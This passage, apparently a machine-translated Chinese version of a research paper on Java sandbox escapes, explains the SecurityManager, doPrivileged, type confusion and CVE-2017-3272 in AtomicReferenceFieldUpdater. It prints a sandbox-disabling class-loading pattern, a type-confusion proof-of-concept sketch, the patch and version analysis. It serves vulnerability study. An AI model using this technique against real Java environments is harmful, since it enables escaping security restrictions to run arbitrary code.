class="function"><span class="keyword">public</span> <span class="title">FileInputStream</span><span class="params">(File file)</span> <span class="keyword">throws</span> FileNotFoundException </span>&#123;</span><br><span class="line"> <span class="number">2</span>:     String name = (file != <span class="keyword">null</span> ? file.getPath() : <span class="keyword">null</span>);</span><br><span class="line"> <span class="number">3</span>:     SecurityManager security = System.getSecurityManager();</span><br><span class="line"> <span class="number">4</span>:     <span class="keyword">if</span> (security != <span class="keyword">null</span>) &#123;</span><br><span class="line"> <span class="number">5</span>:         security.checkRead(name);</span><br><span class="line"> <span class="number">6</span>:     &#125;</span><br><span class="line"> <span class="number">7</span>:     <span class="keyword">if</span> (name == <span class="keyword">null</span>) &#123;</span><br><span class="line"> <span class="number">8</span>:         <span class="keyword">throw</span> <span class="keyword">new</span> NullPointerException();</span><br><span class="line"> <span class="number">9</span>:     &#125;</span><br><span class="line"><span class="number">10</span>:     <span class="keyword">if</span> (file.isInvalid()) &#123;</span><br><span class="line"><span class="number">11</span>:         <span class="keyword">throw</span> <span class="keyword">new</span> FileNotFoundException(<span class="string">"Invalid file path"</span>);</span><br><span class="line"><span class="number">12</span>:     &#125;</span><br><span class="line"><span class="number">13</span>:     fd = <span class="keyword">new</span> FileDescriptor();</span><br><span class="line"><span class="number">14</span>:     fd.incrementAndGetUseCount();</span><br><span class="line"><span class="number">15</span>:     <span class="keyword">this</span>.path = name;</span><br><span class="line"><span class="number">16</span>:     open(name);</span><br><span class="line"><span class="number">17</span>: &#125;</span><br></pre></td></tr></table></figure><p>　　请注意，出于性能原因，仅在设置了安全管理器时才会检查授权（第3-4行）。因此，逃避Java沙箱的典型攻击旨在将安全管理器设置为null。这有效地禁用了所有授权检查。如果没有设置安全管理器，分析师可以执行任何代码，就像它拥有所有授权一样。<br>　　但是，只能在Java级别检查授权。本机代码与所有授权一起执行。虽然在利用内存损坏漏洞时可能直接执行任意分析师的受控本机代码，但在本文的所有示例中，我们都专注于禁用安全管理器以便能够执行具有所有权限的任意Java代码。</p><h4 id="2-4-doPrivileged方法"><a href="#2-4-doPrivileged方法" class="headerlink" title="2.4 doPrivileged方法"></a>2.4 doPrivileged方法</h4><p>　　当检查权限“P”时，JVM检查调用堆栈的每个元素是否具有权限“P”。如果一个元素没有“P”，则抛出安全性异常。这种方法大部分时间都可以正常工作。但是，JCL中某些不需要调用权限的方法m1（）可能需要在JCL中调用另一个方法m2（），而这又需要一个权限“P2”。使用上面的方法，如果没有权限的用户类中的方法main（）调用m1（），则由于m1（）中对m2（）的后续调用，JVM会抛出安全性异常。实际上，在调用堆栈遍历期间，m1（）和m2（）具有所需的权限，因为它们属于JCL中的受信任类，但main（）没有权限。<br>　　解决方案是在doPrivileged（）调用中将m1（）中的调用包装到m2（）中。因此，当检查“P2”时，堆栈遍历停止在调用doPrivileged（）的方法，这里是m1（）。由于m1（）是JCL中的一个方法，因此它具有所有权限。因此，检查成功并且堆栈步行停止。<br>　　一个真实的例子是<em>java.nio.Bits</em>中的方法unaligned（）。它处理网络流并且必须知道处理器的体系结构。但是，获取此信息需要用户代码可能没有的“get_property”权限。因此，在这种情况下，由于权限检查，从不受信任的类调用unaligned（）会失败。因此，检索有关处理器体系结构的信息的unaligned（）中的代码包含在doPrivileged调用中，如下所示（第4-5行）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: <span class="function"><span class="keyword">static</span> <span class="keyword">boolean</span> <span class="title">unaligned</span><span class="params">()</span> </span>&#123;</span><br><span class="line"> <span class="number">2</span>:     <span class="keyword">if</span> (unalignedKnown)</span><br><span class="line"> <span class="number">3</span>:         <span class="keyword">return</span> unaligned;</span><br><span class="line"> <span class="number">4</span>:     String arch = AccessController.doPrivileged(</span><br><span class="line"> <span class="number">5</span>:         <span class="keyword">new</span> sun.security.action.GetPropertyAction(<span class="string">"os.arch"</span>));</span><br><span class="line"> <span class="number">6</span>:     unaligned = arch.equals(<span class="string">"i386"</span>) || arch.equals(<span class="string">"x86"</span>)</span><br><span class="line"> <span class="number">7</span>:         || arch.equals(<span class="string">"amd64"</span>) || arch.equals(<span class="string">"x86_64"</span>);</span><br><span class="line"> <span class="number">8</span>:     unalignedKnown = <span class="keyword">true</span>;</span><br><span class="line"> <span class="number">9</span>:     <span class="keyword">return</span> unaligned;</span><br><span class="line"><span class="number">10</span>: &#125;</span><br></pre></td></tr></table></figure><p>　　选中“get_property”权限后，堆栈遍历将方法检查为Bits.unaligned（），然后停止。</p><h3 id="3-内存腐败漏洞"><a href="#3-内存腐败漏洞" class="headerlink" title="3. 内存腐败漏洞"></a>3. 内存腐败漏洞</h3><h4 id="3-1-类型混乱"><a href="#3-1-类型混乱" class="headerlink" title="3.1 类型混乱"></a>3.1 类型混乱</h4><h5 id="3-1-1-背景"><a href="#3-1-1-背景" class="headerlink" title="3.1.1 背景"></a>3.1.1 背景</h5><p>　　我们描述的第一个内存损坏漏洞是一种类型混淆漏洞。许多Java漏洞依赖于类型混淆漏洞来逃避沙箱以及最近。简而言之，当存在类型混淆时，VM认为对象的类型为_A_，而实际上对象的类型为_B_。如何使用它来禁用安全管理器？<br>　　答案是，类型混淆漏洞可用于访问未经许可无法为分析师提供的方法。分析师所针对的典型方法是<em>ClassLoader</em>类的defineClass（）方法。为什么？好吧，这种方法允许使用所有权限定义自定义类（因此可能是分析师控制的）。因此，分析人员将创建并执行他自己新定义的类，该类包含禁用安全管理器绕过所有授权检查的代码。<br>　　方法defineClass（）是’protected’，因此只能从类<em>ClassLoader</em>中的方法或<em>ClassLoader</em>的子类调用。由于分析师无法修改<em>ClassLoader</em>中的方法，因此他唯一的选择是将<em>ClassLoader</em>子类化为能够调用defineClass（）。但是，直接从没有权限的代码实例化<em>ClassLoader</em>的子类会触发安全异常，因为<em>ClassLoader</em>的构造函数会检查权限“Create_ClassLoader”。诀窍是分析师定义一个扩展<em>ClassLoader</em>的类，例如下面的<em>Help</em>类，并添加一个静态方法，其类型为<em>Help</em>的对象作为参数。然后，分析师从环境中检索现有的<em>ClassLoader</em>实例，并使用类型混淆将其“强制转换”为<em>Help</em>。使用这种方法，JVM认为方法doWork（）（下面的第4行）的h是<em>ClassLoader</em>的子类（而它的实际类型是<em>ClassLoader</em>），因此受保护的方法defineClass（）变得可供分析师使用（受保护的方法） Java可以从子类访问）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Help</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> <span class="keyword">implements</span></span></span><br><span class="line"> 2: Serializable &#123;</span><br><span class="line"> <span class="number">3</span>:</span><br><span class="line"> <span class="number">4</span>:   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">doWork</span><span class="params">(Help h)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line"> <span class="number">5</span>:</span><br><span class="line"> <span class="number">6</span>:     <span class="keyword">byte</span>[] buffer = BypassExploit.getDefaultHelper();</span><br><span class="line"> <span class="number">7</span>:     URL url = <span class="keyword">new</span> URL(<span class="string">"file:///"</span>);</span><br><span class="line"> <span class="number">8</span>:     Certificate[] certs = <span class="keyword">new</span> Certificate[<span class="number">0</span>];</span><br><span class="line"> <span class="number">9</span>:     Permissions perm = <span class="keyword">new</span> Permissions();</span><br><span class="line"><span class="number">10</span>:     perm.add(<span class="keyword">new</span> AllPermission());</span><br><span class="line"><span class="number">11</span>:     ProtectionDomain protectionDomain = <span class="keyword">new</span> ProtectionDomain(</span><br><span class="line"><span class="number">12</span>:      <span class="keyword">new</span> CodeSource(url, certs), perm);</span><br><span class="line"><span class="number">13</span>:</span><br><span class="line"><span class="number">14</span>:     Class cls = h.defineClass(<span class="string">"DefaultHelper"</span>, buffer, <span class="number">0</span>,</span><br><span class="line"><span class="number">15</span>:      buffer.length, protectionDomain);</span><br><span class="line"><span class="number">16</span>:     cls.newInstance();</span><br><span class="line"><span class="number">17</span>:</span><br><span class="line"><span class="number">18</span>:   &#125;</span><br><span class="line"><span class="number">19</span>: &#125;</span><br></pre></td></tr></table></figure><p>　　更准确地说，使用类型混淆漏洞，分析师可以分三步禁用沙箱。首先，分析师可以按如下方式检索应用程序类加载器（此步骤不需要权限）：<code>Object cl = Help.class.getClassLoader();</code><br>　　其次，使用类型混淆漏洞，他可以让VM认为对象cl的类型为<em>Help</em>。<code>Help h = use_type_confusion_to_convert_to_Help(cl);</code><br>　　第三，他提供了h作为<em>Help</em>中静态方法doWork（）的参数，它禁用了安全管理器。<br>　　doWork（）方法首先加载但尚未执行缓冲区中分析师控制的<em>DefaultHelper</em>类的字节码（上面清单中的第6行）。如下所示，此类在其构造函数中禁用doPrivileged（）块中的安全管理器。doPrivileged（）块是必要的，以防止检查整个调用堆栈的权限，因为main（）是调用序列的一部分，它没有权限。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DefaultHelper</span> <span class="keyword">implements</span> <span class="title">PrivilegedExceptionAction</span>&lt;<span class="title">Void</span>&gt; </span>&#123;</span><br><span class="line"><span class="number">2</span>:   <span class="function"><span class="keyword">public</span> <span class="title">DefaultHelper</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="number">3</span>:       AccessController.doPrivileged(<span class="keyword">this</span>);</span><br><span class="line"><span class="number">4</span>:   &#125;</span><br><span class="line"><span class="number">5</span>:</span><br><span class="line"><span class="number">6</span>:   <span class="function"><span class="keyword">public</span> Void <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="number">7</span>:     System.setSecurityManager(<span class="keyword">null</span>);</span><br><span class="line"><span class="number">8</span>:   &#125;</span><br><span class="line"><span class="number">9</span>: &#125;</span><br></pre></td></tr></table></figure><p>　　加载字节码后，它会创建一个具有所有权限的保护域（第7-12行）。最后，它调用h上的defineClass（）（第14-15行）。此调用有效，因为VM认为h的类型为<em>Help</em>。实际上，h的类型为<em>ClassLoader</em>。但是，由于方法defineClass（）在类<em>ClassLoader</em>中定义为受保护方法，因此调用是成功的。此时，分析师已经加载了自己的所有权限。最后一步（第16行）是实例化该类以触发对run（）方法的调用，该方法禁用安全管理器。禁用安全管理器后，分析人员可以执行任何Java代码，就好像它具有所有权限一样。</p><h5 id="3-1-2-示例：CVE-2017-3272"><a href="#3-1-2-示例：CVE-2017-3272" class="headerlink" title="3.1.2 示例：CVE-2017-3272"></a>3.1.2 示例：CVE-2017-3272</h5><p>　　上一节解释了类型混淆漏洞是什么以及分析师如何利用它来禁用安全管理器。本节提供了一个示例，说明了如何使用CVE-2017-3272来实现此类攻击。<br>　　Redhat的bugzilla提供了有关CVE-2017-3272的以下技术细节：<br>　　“据发现，OpenJDK的Libraries组件中的<em>java.util.concurrent.atomic</em>包中的原子字段更新程序没有正确地限制对受保护字段成员的访问。不受信任的Java应用程序或applet可能会利用此漏洞绕过Java沙箱限制“。<br>　　这表明易受攻击的代码位于<em>java.util.concurrent.atomic.package</em>中，这与访问受保护的字段有关。该页面还链接到OpenJDK的补丁“8165344：更新并发支持”。此修补程序修改_AtomicIntegerFieldUpdater _，_ <em>AtomicLongFieldUpdater</em>和<em>AtomicReferenceFieldUpdater</em>类。这些课程用于什么？<br>　　为了处理字段的并发修改，Java提供<em>AtomicLong</em>，<em>AtomicInt</em>和<em>AtomicBoolean</em>等…例如，为了创建可以执行并发修改的一千万个<em>long</em>字段，必须实例化一千万个<em>AtomicLong</em>对象。由于<em>AtomicLong</em>的单个实例需要24个字节+4个字节来引用实例= 28个字节，因此1000万个<em>AtomicLong</em>实例代表267个Mib。<br>　　相比之下，使用<em>AtomicLongFieldUpdater</em>类，它只需要10.000.000 <em> 8 = 76 MiB。实际上，只有长场占据空间。此外，由于_Atomic </em> FieldUpdater_类中的所有方法都是静态的，因此只创建更新程序的单个实例。使用<em>Atomic * FieldUpdater</em>类的另一个好处是垃圾收集器不必跟踪一千万个<em>AtomicLong</em>对象。但是，为了能够这样做，updater使用Java的不安全功能来通过<em>sun.misc.Unsafe</em>类检索目标字段的内存地址。<br>　　如何创建<em>AtomicReferenceFieldUpdater</em>的实例如下所示。方法newUpdater（）必须使用三个参数调用：tclass，包含字段的类的类型，vclass字段的类型和fieldName，字段的名称。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: <span class="keyword">public</span> <span class="keyword">static</span> &lt;U,W&gt; <span class="function">AtomicReferenceFieldUpdater&lt;U,W&gt; <span class="title">newUpdater</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">2</span>:                                 Class&lt;U&gt; tclass,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">3</span>:                                 Class&lt;W&gt; vclass,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">4</span>:                                 String fieldName)</span> </span>&#123;</span><br><span class="line"><span class="number">5</span>:   <span class="keyword">return</span> <span class="keyword">new</span> AtomicReferenceFieldUpdaterImpl&lt;U,W&gt;</span><br><span class="line"><span class="number">6</span>:     (tclass, vclass, fieldName, Reflection.getCallerClass());</span><br><span class="line"><span class="number">7</span>: &#125;</span><br></pre></td></tr></table></figure><p>　　方法newUpdater（）调用<em>AtomicReferenceFieldUpdaterImpl</em>的构造函数来完成实际的工作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: AtomicReferenceFieldUpdaterImpl(<span class="keyword">final</span> Class&lt;T&gt; tclass,</span><br><span class="line"> <span class="number">2</span>:                                 <span class="keyword">final</span> Class&lt;V&gt; vclass,</span><br><span class="line"> <span class="number">3</span>:                                 <span class="keyword">final</span> String fieldName,</span><br><span class="line"> <span class="number">4</span>:                                 <span class="keyword">final</span> Class&lt;?&gt; caller) &#123;</span><br><span class="line"> <span class="number">5</span>:   <span class="keyword">final</span> Field field;</span><br><span class="line"> <span class="number">6</span>:   <span class="keyword">final</span> Class&lt;?&gt; fieldClass;</span><br><span class="line"> <span class="number">7</span>:   <span class="keyword">final</span> <span class="keyword">int</span> modifiers;</span><br><span class="line"> <span class="number">8</span>:   <span class="keyword">try</span> &#123;</span><br><span class="line"> <span class="number">9</span>:     field = AccessController.doPrivileged(</span><br><span class="line"><span class="number">10</span>:       <span class="keyword">new</span> PrivilegedExceptionAction&lt;Field&gt;() &#123;</span><br><span class="line"><span class="number">11</span>:         <span class="function"><span class="keyword">public</span> Field <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchFieldException </span>&#123;</span><br><span class="line"><span class="number">12</span>:           <span class="keyword">return</span> tclass.getDeclaredField(fieldName);</span><br><span class="line"><span class="number">13</span>:         &#125;</span><br><span class="line"><span class="number">14</span>:       &#125;);</span><br><span class="line"><span class="number">15</span>:     modifiers = field.getModifiers();</span><br><span class="line"><span class="number">16</span>:     sun.reflect.misc.ReflectUtil.ensureMemberAccess(</span><br><span class="line"><span class="number">17</span>:       caller, tclass, <span class="keyword">null</span>, modifiers);</span><br><span class="line"><span class="number">18</span>:     ClassLoader cl = tclass.getClassLoader();</span><br><span class="line"><span class="number">19</span>:     ClassLoader ccl = caller.getClassLoader();</span><br><span class="line"><span class="number">20</span>:     <span class="keyword">if</span> ((ccl != <span class="keyword">null</span>) &amp;&amp; (ccl != cl) &amp;&amp;</span><br><span class="line"><span class="number">21</span>:       ((cl == <span class="keyword">null</span>) || !isAncestor(cl, ccl))) &#123;</span><br><span class="line"><span class="number">22</span>:       sun.reflect.misc.ReflectUtil.checkPackageAccess(tclass);</span><br><span class="line"><span class="number">23</span>:     &#125;</span><br><span class="line"><span class="number">24</span>:     fieldClass = field.getType();</span><br><span class="line"><span class="number">25</span>:   &#125; <span class="keyword">catch</span> (PrivilegedActionException pae) &#123;</span><br><span class="line"><span class="number">26</span>:     <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(pae.getException());</span><br><span class="line"><span class="number">27</span>:   &#125; <span class="keyword">catch</span> (Exception ex) &#123;</span><br><span class="line"><span class="number">28</span>:     <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(ex);</span><br><span class="line"><span class="number">29</span>:   &#125;</span><br><span class="line"><span class="number">30</span>:</span><br><span class="line"><span class="number">31</span>:   <span class="keyword">if</span> (vclass != fieldClass)</span><br><span class="line"><span class="number">32</span>:     <span class="keyword">throw</span> <span class="keyword">new</span> ClassCastException();</span><br><span class="line"><span class="number">33</span>:</span><br><span class="line"><span class="number">34</span>:   <span class="keyword">if</span> (!Modifier.isVolatile(modifiers))</span><br><span class="line"><span class="number">35</span>:     <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Must be volatile type"</span>);</span><br><span class="line"><span class="number">36</span>:</span><br><span class="line"><span class="number">37</span>:   <span class="keyword">this</span>.cclass = (Modifier.isProtected(modifiers) &amp;&amp;</span><br><span class="line"><span class="number">38</span>:            caller != tclass) ? caller : <span class="keyword">null</span>;</span><br><span class="line"><span class="number">39</span>:   <span class="keyword">this</span>.tclass = tclass;</span><br><span class="line"><span class="number">40</span>:   <span class="keyword">if</span> (vclass == Object.class)</span><br><span class="line"><span class="number">41</span>:     <span class="keyword">this</span>.vclass = <span class="keyword">null</span>;</span><br><span class="line"><span class="number">42</span>:   <span class="keyword">else</span></span><br><span class="line"><span class="number">43</span>:     <span class="keyword">this</span>.vclass = vclass;</span><br><span class="line"><span class="number">44</span>:   offset = unsafe.objectFieldOffset(field);</span><br><span class="line"><span class="number">45</span>: &#125;</span><br></pre></td></tr></table></figure><p>　　构造函数首先通过反射检索要更新的字段（第12行）。请注意，即使代码没有任何权限，反射调用也会起作用。这是因为调用是在doPrivileged（）块内执行的，该块告诉JVM即使原始调用者具有该权限也允许某些操作（参见第2.4节）。接下来，如果字段具有protected属性并且调用者类与tclass类不同，则调用者存储在cclass中（第37-38行）。请注意，调用者是通过调用Reflection.getCallerClass（）在方法newUpdater（）中设置的。这些行（37-38）很奇怪，因为类调用者可能与类tclass无关。我们将在下面看到这些线是漏洞所在的位置。接下来，构造函数存储tclass，vclass并使用类<em>Unsafe</em>的引用unsafe来获取字段的偏移量（第39-44行）。这是一个红旗，因为<em>Unsafe</em>类非常危险。它可以用于直接操作Java程序中不可能的内存。如果它直接或间接地掌握在分析师手中，它可以用来绕过Java沙箱。<br>　　一旦分析师引用了<em>AtomicReferenceFieldUpdater</em>对象，他就可以调用它上面的set（）方法来更新字段，如下图所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: <span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(T obj, V newValue)</span> </span>&#123;</span><br><span class="line"> <span class="number">2</span>:   accessCheck(obj);</span><br><span class="line"> <span class="number">3</span>:   valueCheck(newValue);</span><br><span class="line"> <span class="number">4</span>:    U.putObjectVolatile(obj, offset, newValue);</span><br><span class="line"> <span class="number">5</span>: &#125;</span><br><span class="line"> <span class="number">6</span>:</span><br><span class="line"> <span class="number">7</span>: <span class="function"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">accessCheck</span><span class="params">(T obj)</span> </span>&#123;</span><br><span class="line"> <span class="number">8</span>:   <span class="keyword">if</span> (!cclass.isInstance(obj))</span><br><span class="line"> <span class="number">9</span>:     throwAccessCheckException(obj);</span><br><span class="line"><span class="number">10</span>: &#125;</span><br><span class="line"><span class="number">11</span>:</span><br><span class="line"><span class="number">12</span>: <span class="function"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">valueCheck</span><span class="params">(V v)</span> </span>&#123;</span><br><span class="line"><span class="number">13</span>:   <span class="keyword">if</span> (v != <span class="keyword">null</span> &amp;&amp; !(vclass.isInstance(v)))</span><br><span class="line"><span class="number">14</span>:     throwCCE();</span><br><span class="line"><span class="number">15</span>: &#125;</span><br></pre></td></tr></table></figure><p>　　set（）的第一个参数obj是必须更新引用字段的实例。第二个参数newValue是参考字段的新值。首先，set（）检查obj是cclass类型的实例（第2行，第7-10行）。然后，set（）检查newValue为null或vclass的实例，表示字段类型（第3,12-15行）。如果所有检查都通过，则<em>Unsafe</em>类用于将新值放在对象obj中的右偏移处（第4行）。<br>　　该漏洞的补丁如下所示。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">- this.cclass = (Modifier.isProtected(modifiers))</span><br><span class="line">-                ? caller : tclass;</span><br><span class="line">+ this.cclass = (Modifier.isProtected(modifiers)</span><br><span class="line">+             &amp;&amp; tclass.isAssignableFrom(caller)</span><br><span class="line">+             &amp;&amp; !isSamePackage(tclass, caller))</span><br><span class="line">+                ? caller : tclass;</span><br></pre></td></tr></table></figure><p>　　正如我们之前注意到的那样，原始代码没有对调用者对象执行足够的检查。在修补版本中，代码现在检查tclass是与调用者的超类还是超级接口相同的类。如何利用此漏洞变得显而易见，如下所示。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: <span class="class"><span class="keyword">class</span> <span class="title">Dummy</span> </span>&#123;</span><br><span class="line"> <span class="number">2</span>:   <span class="keyword">protected</span> <span class="keyword">volatile</span> A f;</span><br><span class="line"> <span class="number">3</span>: &#125;</span><br><span class="line"> <span class="number">4</span>:</span><br><span class="line"> <span class="number">5</span>: <span class="class"><span class="keyword">class</span> <span class="title">MyClass</span> </span>&#123;</span><br><span class="line"> <span class="number">6</span>:   <span class="keyword">protected</span> <span class="keyword">volatile</span> B g;</span><br><span class="line"> <span class="number">7</span>:</span><br><span class="line"> <span class="number">8</span>:   main() &#123;</span><br><span class="line"> <span class="number">9</span>:     m = <span class="keyword">new</span> MyClass();</span><br><span class="line"><span class="number">10</span>:     u = newUpdater(Dummy.class, A.class, <span class="string">"f"</span>);</span><br><span class="line"><span class="number">11</span>:     u.set(m, <span class="keyword">new</span> A());</span><br><span class="line"><span class="number">12</span>:     println(m.g.getClass());</span><br><span class="line"><span class="number">13</span>:   &#125;</span><br><span class="line"><span class="number">14</span>: &#125;</span><br></pre></td></tr></table></figure><p>　　首先，类型为_A_的字段f的类<em>Dummy</em>用于调用newUpdater（）（第1-3,9,10行）。然后，在更新程序实例（第11行）上使用类<em>MyClass</em>调用方法set（），并为类型_A_的字段f调用新值newVal。而不是具有_A_类型的字段f，<em>MyClass</em>具有类型_B_的字段g。因此，调用set（）之后的实际g类型是_A_，但虚拟机假定类型为_B_。println（）调用将打印“A类”而不是“B类”（第12行）。但是，访问类_A_的这个实例是通过类_B_的方法和字段完成的。</p><h5 id="3-1-3-讨论"><a href="#3-1-3-讨论" class="headerlink" title="3.1.3 讨论"></a>3.1.3 讨论</h5><p>　　如上所述，<em>Atomic * FieldUpdater</em>类已经在Java 1.5中引入。但是，该漏洞仅在版本1.8_112中检测到，并在下一版本1.8_121中进行了修补。通过在1.6_到1.8_112版本中的二分法搜索，我们发现该漏洞首次出现在1.8_92版本中。进一步的测试表明，其间的所有版本都是易受攻击的：1.8_101,1.8_102和1.8_111。我们还针对Java 1.5的第一个和最后一个版本测试了PoC：它们不容易受到攻击。<br>　　版本1.8_91（不易受攻击）和1.8_92（易受攻击）之间的<em>AtomicReferenceFieldUpdater</em>差异表明代码重构操作无法保留对输入值执行的所有检查的语义。版本1.8_91的非易受攻击代码如下所示。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>: <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ensureProtectedAccess</span><span class="params">(T obj)</span> </span>&#123;</span><br><span class="line"> <span class="number">2</span>:   <span class="keyword">if</span> (cclass.isInstance(obj)) &#123;</span><br><span class="line"> <span class="number">3</span>:     <span class="keyword">return</span>;</span><br><span class="line"> <span class="number">4</span>:   &#125;</span><br><span class="line"> <span class="number">5</span>:   <span class="keyword">throw</span> <span class="keyword">new</span> RuntimeException(...</span><br><span class="line"> <span class="number">6</span>: &#125;</span><br><span class="line"> <span class="number">7</span>:</span><br><span class="line"> <span class="number">8</span>: <span class="function"><span class="keyword">void</span> <span class="title">updateCheck</span><span class="params">(T obj, V update)</span> </span>&#123;</span><br><span class="line"> <span class="number">9</span>:   <span class="keyword">if</span> (!tclass.isInstance(obj) ||</span><br><span class="line"><span class="number">10</span>:       (update != <span class="keyword">null</span> &amp;&amp; vclass != <span class="keyword">null</span></span><br><span class="line"><span class="number">11</span>:        &amp;&amp; !vclass.isInstance(update)))</span><br><span class="line"><span class="number">12</span>:     <span class="keyword">throw</span> <span class="keyword">new</span> ClassCastException();</span><br><span class="line"><span class="number">13</span>:   <span class="keyword">if</span> (cclass != <span class="keyword">null</span>)</span><br><span class="line"><span class="number">14</span>:     ensureProtectedAccess(obj);</span><br><span class="line"><span class="number">15</span>: &#125;</span><br><span class="line"><span class="number">16</span>:</span><br><span class="line"><span class="number">17</span>: <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">set</span><span class="params">(T obj, V newValue)</span> </span>&#123;</span><br><span class="line"><span class="number">18</span>:   <span class="keyword">if</span> (obj == <span class="keyword">null</span> ||</span><br><span class="line"><span class="number">19</span>:       obj.getClass() != tclass ||</span><br><span class="line"><span class="number">20</span>:       cclass != <span class="keyword">null</span> ||</span><br><span class="line"><span class="number">21</span>:       (newValue != <span class="keyword">null</span></span><br><span class="line"><span class="number">22</span>:        &amp;&amp; vclass != <span class="keyword">null</span></span><br><span class="line"><span class="number">23</span>:        &amp;&amp; vclass != newValue.getClass()))</span><br><span class="line"><span class="number">24</span>:       updateCheck(obj, newValue);</span><br><span class="line"><span class="number">25</span>:   unsafe.putObjectVolatile(obj, offset, newValue);</span><br><span class="line"><span class="number">26</span>: &#125;</span><br></pre></td></tr></table></figure><p>　　在非易受攻击版本中，如果obj的类型与tclass不同，包含要更新的字段的类的类型，则可能有两个条件要传递。第一个是obj可以转换为tclass（第9,12行）。第二个，只检查字段是否受保护，是obj可以转换为cclass（第14,16行）。<br>　　